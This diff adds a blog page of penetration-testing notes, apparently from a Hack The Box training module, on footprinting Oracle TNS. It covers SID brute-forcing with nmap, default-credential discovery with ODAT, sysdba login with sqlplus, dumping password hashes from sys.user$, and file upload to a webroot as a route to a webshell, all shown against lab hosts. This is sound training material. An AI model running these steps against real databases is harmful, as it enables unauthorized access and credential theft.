@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- Google Analytics (gtag.js) - counts your visitors -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-V2R1YY0P62"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-V2R1YY0P62');
+  </script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Footprinting Oracle TNS · Aymane Elouafi</title>
+  <meta name="description" content="Oracle TNS and its config files, scanning port 1521, brute-forcing SIDs, enumerating with ODAT, logging in with sqlplus, dumping hashes and file upload to RCE.">
+  <meta name="author" content="Aymane Elouafi">
+  <meta name="robots" content="index, follow, max-image-preview:large">
+  <meta name="google-site-verification" content="P6WC3YGSehH9r2o-Lon_-tKZGpFiOWJjHD41vtJqLsk">
+  <link rel="canonical" href="https://aymaneelouafi.me/oracle-tns.html">
+  <link rel="icon" href="/images/skull.svg">
+
+  <!-- Open Graph (Facebook, LinkedIn, Discord...) -->
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Footprinting Oracle TNS · Aymane Elouafi">
+  <meta property="og:description" content="Oracle TNS and its config files, scanning port 1521, brute-forcing SIDs, enumerating with ODAT, logging in with sqlplus, dumping hashes and file upload to RCE.">
+  <meta property="og:url" content="https://aymaneelouafi.me/oracle-tns.html">
+  <meta property="og:site_name" content="Aymane Elouafi">
+  <meta property="og:image" content="https://aymaneelouafi.me/images/og.png">
+
+  <!-- Twitter / X -->
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Footprinting Oracle TNS · Aymane Elouafi">
+  <meta name="twitter:description" content="Oracle TNS and its config files, scanning port 1521, brute-forcing SIDs, enumerating with ODAT, logging in with sqlplus, dumping hashes and file upload to RCE.">
+  <meta name="twitter:image" content="https://aymaneelouafi.me/images/og.png">
+
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Footprinting Oracle TNS",
+  "description": "Oracle TNS and its config files, scanning port 1521, brute-forcing SIDs, enumerating with ODAT, logging in with sqlplus, dumping hashes and file upload to RCE.",
+  "datePublished": "2026-10-24",
+  "dateModified": "2026-10-24",
+  "author": {
+    "@type": "Person",
+    "name": "Aymane Elouafi",
+    "url": "https://aymaneelouafi.me"
+  },
+  "publisher": {
+    "@type": "Person",
+    "name": "Aymane Elouafi",
+    "url": "https://aymaneelouafi.me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://aymaneelouafi.me/oracle-tns.html"
+  },
+  "url": "https://aymaneelouafi.me/oracle-tns.html",
+  "image": "https://aymaneelouafi.me/images/og.png",
+  "keywords": "htb, footprinting, oracle, tns, database, odat, sqlplus, enumeration",
+  "inLanguage": "en"
+}
+  </script>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Rubik+Glitch&family=Share+Tech+Mono&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/style.css?v=1792878867046">
+  <script defer src="/menu.js?v=1792878867046"></script>
+</head>
+<body>
+  <div class="topbar">
+    <button class="menu-toggle" aria-label="Open menu" aria-expanded="false">☰ menu</button>
+    <a class="topbar-home" href="/index.html">~/aymane</a>
+  </div>
+  <div class="backdrop" id="backdrop"></div>
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-inner">
+      <p class="sidebar-title">// methodology &amp; notes</p>
+    <details class="nav-phase" open>
+      <summary><span class="nav-num">1</span> Information Gathering</summary>
+        <div class="nav-section">
+          <span class="nav-sec-title">Host Discovery &amp; Port Scanning</span>
+          <ul>
+            <li><a href="nmap.html">Network Enumeration with Nmap</a></li>
+          </ul>
+        </div>
+        <div class="nav-section">
+          <span class="nav-sec-title">Service Enumeration / Footprinting</span>
+          <ul>
+            <li><a href="nfs.html">Footprinting NFS</a></li>
+            <li><a href="ftp.html">Footprinting FTP</a></li>
+            <li><a href="dns.html">Footprinting DNS</a></li>
+            <li><a href="smtp.html">Footprinting SMTP</a></li>
+            <li><a href="imap-pop3.html">Footprinting IMAP / POP3</a></li>
+            <li><a href="snmp.html">Footprinting SNMP</a></li>
+            <li><a href="mysql.html">Footprinting MySQL</a></li>
+            <li><a href="mssql.html">Footprinting MSSQL</a></li>
+            <li><a href="oracle-tns.html" class="current">Footprinting Oracle TNS</a></li>
+          </ul>
+        </div>
+        <div class="nav-section empty"><span class="nav-sec-title">Web Recon</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">2</span> Vulnerability Assessment</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Known Vulnerabilities (version → CVE)</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Web Vulnerabilities</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Misconfigurations &amp; Default Credentials</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">3</span> Exploitation</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Service / Network Exploitation</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Web Exploitation</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Password Attacks</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">4</span> Post-Exploitation</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Local Enumeration</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Privilege Escalation (Linux / Windows)</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Looting &amp; Credential Hunting</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">5</span> Lateral Movement</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">Pivoting &amp; Tunneling</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Credential Reuse &amp; Pass-the-Hash</span></div>
+    </details>
+    <details class="nav-phase">
+      <summary><span class="nav-num">6</span> Active Directory</summary>
+        <div class="nav-section empty"><span class="nav-sec-title">AD Enumeration</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">AD Attacks</span></div>
+        <div class="nav-section empty"><span class="nav-sec-title">Domain Dominance &amp; Lateral Movement</span></div>
+    </details>
+    <details class="nav-phase nav-walk">
+      <summary><span class="nav-num">★</span> HTB Walkthroughs</summary>
+      <div class="nav-section">
+        <ul>
+          <li><a href="cap.html">Cap - HTB Walkthrough</a></li>
+        </ul>
+      </div>
+    </details>
+    </div>
+  </aside>
+  <main class="container post">
+
+    <a class="back" href="/index.html">← cd ..</a>
+
+    <span class="series-label">Footprinting Services</span>
+    <h1>Footprinting Oracle TNS</h1>
+    <p class="post-meta">2026-10-24 · #htb #footprinting #oracle #tns #database #odat #sqlplus #enumeration</p>
+
+    <input id="post-search" class="search post-search" type="text"
+           placeholder="search in this post...  (Enter = next, Shift+Enter = previous, Esc = clear)"
+           autocomplete="off">
+    <p id="post-search-count" class="search-count" hidden></p>
+
+  <details class="cheatsheet">
+    <summary><span class="arrow">&#9656;</span> Cheat sheet &mdash; useful commands</summary>
+    <div class="cheat-body">
+      <div class="cheat-row">
+        <code>nmap -p1521 -sV &lt;target&gt; --open</code>
+        <span>Find the Oracle TNS listener</span>
+      </div>
+      <div class="cheat-row">
+        <code>nmap -p1521 --script oracle-sid-brute &lt;target&gt;</code>
+        <span>Brute force the SID</span>
+      </div>
+      <div class="cheat-row">
+        <code>./odat.py all -s &lt;target&gt;</code>
+        <span>Run every ODAT module (creds, misconfigs...)</span>
+      </div>
+      <div class="cheat-row">
+        <code>sqlplus &lt;user&gt;/&lt;pass&gt;@&lt;target&gt;/&lt;SID&gt;</code>
+        <span>Log in to the database</span>
+      </div>
+      <div class="cheat-row">
+        <code>sqlplus &lt;user&gt;/&lt;pass&gt;@&lt;target&gt;/&lt;SID&gt; as sysdba</code>
+        <span>Try logging in as sysdba</span>
+      </div>
+      <div class="cheat-row">
+        <code>select name, password from sys.user$;</code>
+        <span>Dump password hashes</span>
+      </div>
+      <div class="cheat-row">
+        <code>./odat.py utlfile -s &lt;target&gt; -d &lt;SID&gt; -U &lt;u&gt; -P &lt;p&gt; --sysdba --putFile ...</code>
+        <span>Upload a file (webshell to RCE)</span>
+      </div>
+    </div>
+  </details>
+
+
+
+    <article id="content">
+<p>The <code>Oracle Transparent Network Substrate</code> (<code>TNS</code>) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the <a href="https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html">Oracle Net Services</a> software suite, TNS supports various networking protocols between Oracle databases and client applications, such as <code>IPX/SPX</code> and <code>TCP/IP</code> protocol stacks. As a result, it has become a preferred solution for managing large, complex databases in the healthcare, finance, and retail industries. In addition, its built-in encryption mechanism ensures the security of data transmitted, making it an ideal solution for enterprise environments where data security is paramount.</p>
+<p>Over time, TNS has been updated to support newer technologies, including <code>IPv6</code> and <code>SSL/TLS</code> encryption which makes it more suitable for the following purposes:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Name resolution</td>
+<td>Connection management</td>
+<td>Load balancing</td>
+<td>Security</td>
+</tr>
+</tbody></table>
+<p>Furthermore, it enables encryption between client and server communication through an additional layer of security over the TCP/IP protocol layer. This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.</p>
+<h2>Default Configuration</h2>
+<ul>
+<li>Default config varies depending on the Oracle <strong>version and edition</strong> installed, but some settings are common by default.</li>
+<li>Listener listens for incoming connections on <strong>TCP/1521</strong> by default — can be changed during install or later in the config file.</li>
+<li>TNS listener supports various network protocols: <strong>TCP/IP, UDP, IPX/SPX, and AppleTalk</strong>.</li>
+<li>Can support multiple network interfaces — listen on <strong>specific IP addresses or all available interfaces</strong>.</li>
+<li>Oracle TNS can be <strong>remotely managed in Oracle 8i/9i, but not in Oracle 10g/11g</strong> by default.</li>
+<li>Default config includes a few basic security features:<ul>
+<li>Listener only accepts connections from <strong>authorized hosts</strong>.</li>
+<li>Performs basic authentication using a combination of <strong>hostnames, IP addresses, and usernames/passwords</strong>.</li>
+<li>Uses <strong>Oracle Net Services</strong> to encrypt communication between client and server.</li>
+</ul>
+</li>
+<li>Config files are <strong><code>tnsnames.ora</code></strong> and <strong><code>listener.ora</code></strong>, typically located in <strong><code>$ORACLE_HOME/network/admin</code></strong>.</li>
+<li>These plain-text files contain configuration info for Oracle database instances and other network services using the TNS protocol.</li>
+<li>Oracle TNS is often used with other Oracle services: <strong>Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers</strong>, and many more.</li>
+<li>Many changes have been made to default installations of Oracle services:<ul>
+<li><strong>Oracle 9</strong> has a default password: <strong><code>CHANGE_ON_INSTALL</code></strong>.</li>
+<li><strong>Oracle 10</strong> has <strong>no default password</strong> set.</li>
+<li>The <strong>Oracle DBSNMP</strong> service uses a default password: <strong><code>dbsnmp</code></strong> — worth remembering when you come across it.</li>
+</ul>
+</li>
+<li>Many organizations still use the <strong>finger service</strong> together with Oracle, which can put Oracle&#39;s service at risk and make it vulnerable when you have the required knowledge of a <strong>home directory</strong>.</li>
+</ul>
+<p>Each database or service has a unique entry in the <a href="https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm">tnsnames.ora</a> file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. For example, a simple <code>tnsnames.ora</code> file might look like this:</p>
+<h3>Tnsnames.ora</h3>
+<pre><code>ORCL =
+  (DESCRIPTION =
+    (ADDRESS_LIST =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
+    )
+    (CONNECT_DATA =
+      (SERVER = DEDICATED)
+      (SERVICE_NAME = orcl)
+    )
+  )
+</code></pre>
+<p>Here we can see a service called <code>ORCL</code>, which is listening on port <code>TCP/1521</code> on the IP address <code>10.129.11.102</code>. Clients should use the service name <code>orcl</code> when connecting to the service. However, the tnsnames.ora file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.</p>
+<p>On the other hand, the <code>listener.ora</code> file is a server-side configuration file that defines the listener process&#39;s properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.</p>
+<h3>Listener.ora</h3>
+<pre><code>SID_LIST_LISTENER =
+  (SID_LIST =
+    (SID_DESC =
+      (SID_NAME = PDB1)
+      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
+      (GLOBAL_DBNAME = PDB1)
+      (SID_DIRECTORY_LIST =
+        (SID_DIRECTORY =
+          (DIRECTORY_TYPE = TNS_ADMIN)
+          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
+        )
+      )
+    )
+  )
+
+LISTENER =
+  (DESCRIPTION_LIST =
+    (DESCRIPTION =
+      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
+      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
+    )
+  )
+
+ADR_BASE_LISTENER = C:\oracle
+</code></pre>
+<p>In short, the client-side Oracle Net Services software uses the <code>tnsnames.ora</code> file to resolve service names to network addresses, while the listener process uses the <code>listener.ora</code> file to determine the services it should listen to and the behavior of the listener.</p>
+<p>Oracle databases can be protected by using a so-called PL/SQL Exclusion List (<code>PlsqlExclusionList</code>). It is a user-created text file that needs to be placed in the <code>$ORACLE_HOME/sqldeveloper</code> directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. It serves as a blacklist that cannot be accessed through the Oracle Application Server.</p>
+<table>
+<thead>
+<tr>
+<th><strong>Setting</strong></th>
+<th><strong>Description</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>DESCRIPTION</code></td>
+<td>A descriptor that provides a name for the database and its connection type.</td>
+</tr>
+<tr>
+<td><code>ADDRESS</code></td>
+<td>The network address of the database, which includes the hostname and port number.</td>
+</tr>
+<tr>
+<td><code>PROTOCOL</code></td>
+<td>The network protocol used for communication with the server</td>
+</tr>
+<tr>
+<td><code>PORT</code></td>
+<td>The port number used for communication with the server</td>
+</tr>
+<tr>
+<td><code>CONNECT_DATA</code></td>
+<td>Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.</td>
+</tr>
+<tr>
+<td><code>INSTANCE_NAME</code></td>
+<td>The name of the database instance the client wants to connect.</td>
+</tr>
+<tr>
+<td><code>SERVICE_NAME</code></td>
+<td>The name of the service that the client wants to connect to.</td>
+</tr>
+<tr>
+<td><code>SERVER</code></td>
+<td>The type of server used for the database connection, such as dedicated or shared.</td>
+</tr>
+<tr>
+<td><code>USER</code></td>
+<td>The username used to authenticate with the database server.</td>
+</tr>
+<tr>
+<td><code>PASSWORD</code></td>
+<td>The password used to authenticate with the database server.</td>
+</tr>
+<tr>
+<td><code>SECURITY</code></td>
+<td>The type of security for the connection.</td>
+</tr>
+<tr>
+<td><code>VALIDATE_CERT</code></td>
+<td>Whether to validate the certificate using SSL/TLS.</td>
+</tr>
+<tr>
+<td><code>SSL_VERSION</code></td>
+<td>The version of SSL/TLS to use for the connection.</td>
+</tr>
+<tr>
+<td><code>CONNECT_TIMEOUT</code></td>
+<td>The time limit in seconds for the client to establish a connection to the database.</td>
+</tr>
+<tr>
+<td><code>TRACE_LEVEL</code></td>
+<td>The level of tracing for the database connection.</td>
+</tr>
+<tr>
+<td><code>TRACE_DIRECTORY</code></td>
+<td>The directory where the trace files are stored.</td>
+</tr>
+<tr>
+<td><code>LOG_FILE</code></td>
+<td>The file where the log information is stored.</td>
+</tr>
+</tbody></table>
+<h2>Enumeration &amp; Footprinting</h2>
+<p>Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our <code>Pwnbox</code> instance in case it does not have these already. Here is a list of commands that does all of that:</p>
+<h3>Setting up - ODAT</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sudo apt-get update
+sudo apt-get install -y build-essential python3-dev libaio1
+cd ~
+wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
+tar xzf cx_Oracle-8.3.0.tar.gz
+cd cx_Oracle-8.3.0
+python3 setup.py build
+sudo python3 setup.py install
+cd ~
+git clone https://github.com/quentinhardy/odat.git
+cd odat/
+pip install python-libnmap
+git submodule init
+git submodule update
+sudo apt-get install python3-scapy -y
+sudo pip3 install colorlog termcolor passlib python-libnmap
+sudo apt-get install build-essential libgmp-dev -y
+pip3 install pycryptodome
+pip3 install openpyxl
+
+&lt;SNIP&gt;
+</code></pre>
+<p>Oracle Database Attacking Tool (<code>ODAT</code>) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws, including SQL injection, remote code execution, and privilege escalation.</p>
+<p>Let&#39;s now use <code>nmap</code> to scan the default Oracle TNS listener port.</p>
+<h3>Nmap</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
+Nmap scan report for 10.129.204.235
+Host is up (0.0041s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
+</code></pre>
+<p>We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (<code>SID</code>) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. When a client connects to an Oracle database, it specifies the database&#39;s <code>SID</code> along with its connection string. If the client specifies an incorrect SID, the connection attempt will fail. If the client does not specify a SID, the default value defined in the <code>tnsnames.ora</code> file is used.</p>
+<p>There are various ways to enumerate, or better said, guess SIDs. We can use tools like <code>nmap</code>, <code>hydra</code>, <code>odat</code>, and others. Let us use <code>nmap</code> first.</p>
+<h3>Nmap - SID Bruteforcing</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
+Nmap scan report for 10.129.204.235
+Host is up (0.0044s latency).
+
+PORT     STATE SERVICE    VERSION
+1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
+| oracle-sid-brute: 
+|_  XE
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
+</code></pre>
+<p>We can use the <code>odat.py</code> tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the <code>all</code> option and try all modules of the <code>odat.py</code> tool.</p>
+<h3>ODAT</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ ./odat.py all -s 10.129.204.235
+
+[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
+[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...
+
+&lt;SNIP&gt;
+
+[!] Notice: &#39;mdsys&#39; account is locked, so skipping this username for password
+[!] Notice: &#39;oracle_ocm&#39; account is locked, so skipping this username for password
+[!] Notice: &#39;outln&#39; account is locked, so skipping this username for password
+[+] Valid credentials found: scott/tiger. Continue...
+
+&lt;SNIP&gt;
+</code></pre>
+<p>In this example, we found valid credentials for the user <code>scott</code> and his password <code>tiger</code>. After that, we can use the tool <code>sqlplus</code> to connect to the Oracle database and interact with it.</p>
+<p>Before we can use <code>sqlplus</code> on our <code>Pwnbox</code>, we need to update and upgrade <code>parrot-core</code> and install the <code>oracle-instantclient-sqlplus</code> package.</p>
+<h3>Setting up - SQLplus</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sudo apt update
+sudo apt upgrade parrot-core
+sudo apt update
+sudo apt install oracle-instantclient-sqlplus
+</code></pre>
+<p>If you come across the following error <code>sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory</code>, please execute the below.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sudo sh -c &quot;echo /usr/lib/oracle/12.2/client64/lib &gt; /etc/ld.so.conf.d/oracle-instantclient.conf&quot;;sudo ldconfig
+</code></pre>
+<p>Finally, we can execute <code>sqlplus -v</code> to check if the tool will be executed without errors.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sqlplus -v
+
+SQL*Plus: Release 19.0.0.0.0 - Production
+Version 19.6.0.0.0
+</code></pre>
+<h3>SQLplus - Log In</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE
+
+SQL*Plus: Release 19.0.0.0.0 - Production
+Version 19.6.0.0.0
+
+Copyright (c) 1982, 2021, Oracle. All rights reserved.
+
+ERROR:
+ORA-28002: the password will expire within 7 days
+
+Connected to:
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
+
+SQL&gt;
+</code></pre>
+<p>There are many SQLplus commands that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:</p>
+<h3>Oracle RDBMS - Interaction</h3>
+<pre><code class="language-shell">SQL&gt; select table_name from all_tables;
+
+TABLE_NAME
+------------------------------
+DUAL
+SYSTEM_PRIVILEGE_MAP
+TABLE_PRIVILEGE_MAP
+STMT_AUDIT_OPTION_MAP
+AUDIT_ACTIONS
+HELP
+
+&lt;SNIP&gt;
+
+
+SQL&gt; select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SCOTT                          CONNECT                        NO  YES NO
+SCOTT                          RESOURCE                       NO  YES NO
+</code></pre>
+<p>Here, the user <code>scott</code> has no administrative privileges. However, we can try using this account to log in as the System Database Admin (<code>sysdba</code>), giving us higher privileges. This is possible when the user <code>scott</code> has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.</p>
+<h3>Oracle RDBMS - Database Enumeration</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba
+
+SQL&gt; select * from user_role_privs;
+
+USERNAME                       GRANTED_ROLE                   ADM DEF OS_
+------------------------------ ------------------------------ --- --- ---
+SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
+SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
+SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
+SYS                            AUTHENTICATEDUSER              YES YES NO
+SYS                            CONNECT                        YES YES NO
+SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
+SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
+SYS                            DBA                            YES YES NO
+
+&lt;SNIP&gt;
+</code></pre>
+<p>We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. From this point, we could retrieve the password hashes from the <code>sys.user$</code> and try to crack them offline. The query for this would look like the following:</p>
+<h3>Oracle RDBMS - Extract Password Hashes</h3>
+<pre><code class="language-shell">SQL&gt; select name, password from sys.user$;
+
+NAME                           PASSWORD
+------------------------------ ------------------------------
+SYS                            FBA343E7D6C8BC9D
+PUBLIC
+CONNECT
+RESOURCE
+DBA
+SYSTEM                         B5073FE1DE351687
+OUTLN                          4A3BA55E08595C81
+
+&lt;SNIP&gt;
+</code></pre>
+<p>Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. If we know what type of system we are dealing with, we can try the default paths, which are:</p>
+<table>
+<thead>
+<tr>
+<th><strong>OS</strong></th>
+<th><strong>Path</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Linux</td>
+<td><code>/var/www/html</code></td>
+</tr>
+<tr>
+<td>Windows</td>
+<td><code>C:\inetpub\wwwroot</code></td>
+</tr>
+</tbody></table>
+<h3>Oracle RDBMS - File Upload</h3>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ echo &quot;Oracle File Upload Test&quot; &gt; testing.txt
+aymane0x90@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server
+[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
+</code></pre>
+<p>Finally, we can test if the file upload approach worked with <code>curl</code>. We will use a <code>GET http://&lt;IP&gt;</code> request, or we can visit via browser.</p>
+<pre><code class="language-shell">aymane0x90@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt
+
+Oracle File Upload Test
+</code></pre>
+
+    </article>
+
+  <nav class="series">
+    <p class="prompt">$ ls ~/series/footprinting-services</p>
+    <ul>
+      <li><a href="nfs.html">Footprinting NFS</a></li>
+      <li><a href="ftp.html">Footprinting FTP</a></li>
+      <li><a href="dns.html">Footprinting DNS</a></li>
+      <li><a href="smtp.html">Footprinting SMTP</a></li>
+      <li><a href="imap-pop3.html">Footprinting IMAP / POP3</a></li>
+      <li><a href="snmp.html">Footprinting SNMP</a></li>
+      <li><a href="mysql.html">Footprinting MySQL</a></li>
+      <li><a href="mssql.html">Footprinting MSSQL</a></li>
+      <li class="current">Footprinting Oracle TNS &lt;- you are here</li>
+    </ul>
+  </nav>
+
+  </main>
+
+  <script src="/post.js?v=1792878867046"></script>
+</body>
+</html>
